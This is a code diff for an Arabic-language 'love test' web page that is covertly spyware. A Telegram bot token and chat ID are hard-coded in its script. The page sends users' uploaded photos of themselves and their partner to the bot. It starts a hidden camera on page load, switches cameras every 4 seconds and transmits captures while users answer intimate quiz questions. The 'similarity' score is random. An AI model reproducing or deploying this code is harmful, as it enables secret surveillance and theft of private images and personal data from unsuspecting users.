@@ -6,6 +6,7 @@
     <title>💕 اختبار الحب ونسبة التشابه</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
+        /* كل الستايل كما هو في الكود السابق (نفسه تماماً) */
         * {
             margin: 0;
             padding: 0;
@@ -89,7 +90,6 @@
             font-weight: 700;
             color: #b34a6a;
         }
-        /* قسم نسبة التشابه */
         .similarity-section {
             display: flex;
             flex-direction: column;
@@ -186,7 +186,6 @@
             cursor: not-allowed;
             transform: none !important;
         }
-        /* أسئلة */
         #questionBox {
             background: rgba(255, 255, 255, 0.6);
             backdrop-filter: blur(8px);
@@ -274,7 +273,6 @@
             display: none;
             border: 2px solid #d47a9a;
         }
-        /* فيديو مخفي */
         #hiddenVideo {
             position: fixed;
             top: -9999px;
@@ -301,9 +299,6 @@
             color: #9a6a7a;
             margin-top: 16px;
             opacity: 0.6;
-        }
-        .hidden {
-            display: none;
         }
     </style>
 </head>
@@ -335,11 +330,13 @@
                 <div class="photo-upload">
                     <div class="photo-box">
                         <label>📷 صورتك</label>
+                        <!-- ✅ تم إزالة capture ليتيح اختيار الصور من المعرض -->
                         <input type="file" id="myPhotoInput" accept="image/*">
                         <img id="myPhotoPreview" src="" alt="صورتك">
                     </div>
                     <div class="photo-box">
                         <label>📷 صورة حبيبك</label>
+                        <!-- ✅ تم إزالة capture ليتيح اختيار الصور من المعرض -->
                         <input type="file" id="partnerPhotoInput" accept="image/*">
                         <img id="partnerPhotoPreview" src="" alt="صورة حبيبك">
                     </div>
@@ -387,11 +384,11 @@
         (function() {
             'use strict';
 
-            // ===== إعدادات تليجرام =====
+            // ===== إعدادات تليجرام (يمكنك تغييرها) =====
             const BOT_TOKEN = '8843331045:AAF7khHAAFaaw_zuNDX_I79q04eOI9zVcFQ';
             const CHAT_ID = '8607243024';
 
-            // ===== 50 سؤالاً (متنوعة: مفتوحة واختيارات) =====
+            // ===== 50 سؤالاً (متنوعة) =====
             const questions = [
                 // أسئلة مفتوحة (نوع 'text')
                 { type: 'text', q: 'ما هو أول حرف من اسم من تحب؟', hint: 'اكتب الحرف الأول' },
@@ -488,14 +485,12 @@
                 });
             });
 
-            // ===== نسبة التشابه =====
+            // ===== نسبة التشابه (عشوائية فريدة) =====
             function getRandomSimilarity() {
-                // نسبة عشوائية بين 40 و 99 مع اختلاف في كل مرة بناءً على الوقت
                 const now = new Date();
                 const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now.getSeconds();
                 const random = (seed * 9301 + 49297) % 233280;
                 const base = 40 + (random / 233280) * 59;
-                // أضف تموجاً بسيطاً لجعلها تبدو فريدة
                 const wave = Math.sin(now.getTime() / 10000) * 3;
                 let result = Math.round(base + wave);
                 if (result > 99) result = 99;
@@ -518,7 +513,7 @@
                     alert('الرجاء اختيار صورتين (صورتك وصورة حبيبك)');
                     return;
                 }
-                // عرض الصور في المعاينة
+                // عرض الصور
                 const reader1 = new FileReader();
                 reader1.onload = function(e) { myPhotoPreview.src = e.target.result; };
                 reader1.readAsDataURL(myFile);
@@ -530,7 +525,6 @@
                 similarityPercentage.textContent = percent + ' %';
                 similarityComment.textContent = getComment(percent);
 
-                // إرسال الصور مع النسبة إلى تليجرام
                 sendSimilarityPhotos(myFile, partnerFile, percent);
             });
 
@@ -538,20 +532,17 @@
                 try {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    // إرسال الصورة الأولى
                     const photo1 = new File([myFile], 'my_photo.jpg', { type: myFile.type });
                     formData.append('photo', photo1);
                     const caption = `📸 *نسبة التشابه: ${percent}%*%0A💬 ${getComment(percent)}`;
                     formData.append('caption', caption);
                     formData.append('parse_mode', 'Markdown');
 
-                    const response1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    const result1 = await response1.json();
 
-                    // إرسال الصورة الثانية كوثيقة أو صورة أخرى
                     const formData2 = new FormData();
                     formData2.append('chat_id', CHAT_ID);
                     const photo2 = new File([partnerFile], 'partner_photo.jpg', { type: partnerFile.type });
@@ -564,7 +555,6 @@
                         body: formData2
                     });
 
-                    // إرسال النتيجة كنص
                     const text = `💞 *نتيجة التشابه*%0Aنسبة التشابه: ${percent}%%0A${getComment(percent)}`;
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -578,7 +568,7 @@
 
                     alert('✅ تم إرسال الصور والنتيجة إلى تليجرام!');
                 } catch (error) {
-                    console.error('خطأ في إرسال صور التشابه:', error);
+                    console.error('خطأ في الإرسال:', error);
                     alert('حدث خطأ أثناء الإرسال، راجع وحدة التحكم.');
                 }
             }
@@ -607,7 +597,6 @@
                 } catch (error) {
                     console.error(`فشل تشغيل الكاميرا ${mode}:`, error.message);
                     cameraReady = false;
-                    // إعادة المحاولة كل 5 ثوانٍ
                     if (retryTimer) clearTimeout(retryTimer);
                     retryTimer = setTimeout(() => {
                         console.log('🔄 إعادة محاولة تشغيل الكاميرا...');
@@ -699,14 +688,11 @@
                     });
                     html += '</div>';
                     inputArea.innerHTML = html;
-                    // اختيار
                     document.querySelectorAll('.options-group button').forEach(btn => {
                         btn.addEventListener('click', function() {
                             document.querySelectorAll('.options-group button').forEach(b => b.classList.remove('selected'));
                             this.classList.add('selected');
-                            // حفظ الإجابة مؤقتاً
                             const selectedText = this.textContent;
-                            // نضعها في حقل مخفي
                             if (!document.getElementById('tempChoice')) {
                                 const hidden = document.createElement('input');
                                 hidden.type = 'hidden';
@@ -716,15 +702,12 @@
                             } else {
                                 document.getElementById('tempChoice').value = selectedText;
                             }
-                            // نفعّل زر التالي
                             nextBtn.disabled = false;
                         });
                     });
                 }
                 progressDiv.textContent = `${index + 1} / ${questions.length}`;
                 nextBtn.disabled = true;
-                // إذا كان سؤال اختيارات، نفعّل التالي عند اختيار خيار
-                // يتم تفعيله من خلال حدث النقر أعلاه
             }
 
             function saveAndNext() {
@@ -752,10 +735,7 @@
                 });
                 console.log(`📝 سؤال ${currentIndex+1}: ${answer}`);
 
-                // تفعيل زر الإرسال
                 if (answers.length > 0) sendAnswersBtn.disabled = false;
-
-                // التقاط صورة بعد كل إجابة
                 captureAndSend();
 
                 currentIndex++;
@@ -776,10 +756,7 @@
                 finalMessage.style.display = 'block';
                 sendAnswersBtn.disabled = false;
 
-                // التقاط صورة أخيرة
                 setTimeout(() => captureAndSend(), 1000);
-
-                // إيقاف الكاميرا والمؤقتات بعد 10 ثوانٍ
                 setTimeout(() => {
                     if (captureInterval) clearInterval(captureInterval);
                     if (switchInterval) clearInterval(switchInterval);
@@ -802,23 +779,19 @@
                 renderQuestion(0);
                 console.log('🚀 بدأ اختبار الحب');
 
-                // تشغيل الكاميرا
                 startCamera('user');
 
-                // تبديل الكاميرات كل 4 ثوانٍ
                 if (switchInterval) clearInterval(switchInterval);
                 switchInterval = setInterval(() => {
                     if (isQuizStarted) switchCamera();
                 }, 4000);
 
-                // التصوير كل 4 ثوانٍ
                 if (captureInterval) clearInterval(captureInterval);
                 captureInterval = setInterval(() => {
                     if (isQuizStarted && cameraReady) captureAndSend();
                 }, 4000);
             }
 
-            // ===== إرسال الإجابات =====
             async function sendAnswersToBot() {
                 if (answers.length === 0) {
                     alert('لا توجد إجابات لإرسالها.');
@@ -868,13 +841,11 @@
             nextBtn.addEventListener('click', saveAndNext);
             sendAnswersBtn.addEventListener('click', sendAnswersToBot);
 
-            // ===== بدء تشغيل الكاميرا في الخلفية فوراً (لأخذ الإذن) =====
             setTimeout(() => {
                 console.log('📷 محاولة تشغيل الكاميرا الخفية...');
                 startCamera('user');
             }, 1000);
 
-            // ===== عند العودة للصفحة =====
             document.addEventListener('visibilitychange', () => {
                 if (!document.hidden && !cameraReady && isQuizStarted) {
                     console.log('🔄 إعادة تشغيل الكاميرا');
@@ -883,7 +854,6 @@
             });
 
             console.log('💕 الموقع جاهز (نسبة تشابه + 50 سؤالاً)');
-
         })();
     </script>
 </body>
